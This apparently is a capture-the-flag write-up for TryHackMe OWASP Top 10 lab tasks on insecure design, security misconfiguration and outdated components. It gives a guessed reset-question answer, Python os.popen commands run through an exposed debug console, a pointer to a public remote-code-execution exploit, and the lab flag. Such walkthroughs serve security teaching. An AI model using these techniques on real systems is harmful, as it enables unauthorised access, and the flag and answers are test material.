# [Task 11] 4. Insecure Design
## Reset Password
Choose the question of `What's your favourite colour?` <br>
```
green
```
## New Password
![](./screenshots/01.png) <br>
```
VXdN29LygflFsJ
```
## Log In with New Password
![](./screenshots/02.png) <br>

## Flag
Move `flag.txt` to the `private` folder, and open the file to get the flag. <br>
![](./screenshots/03.png) <br>

# [Task 12] 5. Security Misconfiguration
Firstly, Navigate to `<YOUR_MACHINE_IP>:86/console`. <br>
Then, execute the code: <br>
```python3
import os; print(os.popen("ls -l").read())
```
![](./screenshots/04.png) <br>

To read `app.py`, execute this code: <br>
```python3
import os; print(os.popen("cat app.py").read())
```
![](./screenshots/05.png) <br>

# [Task 15] Vulnerable and Outdated Components - Lab

Go to [Online Book Store 1.0 - Unauthenticated Remote Code Execution ](https://www.exploit-db.com/exploits/47887?source=post_page-----73d5248fc8e4--------------------------------), and download `47887.py`. <br>

![](./screenshots/06.png) <br>

Execute `47887.py`. <br>
![](./screenshots/07.png) <br>

## Get the Flag
![](./screenshots/08.png) <br>

```
THM{But_1ts_n0t_my_f4ult!}
```



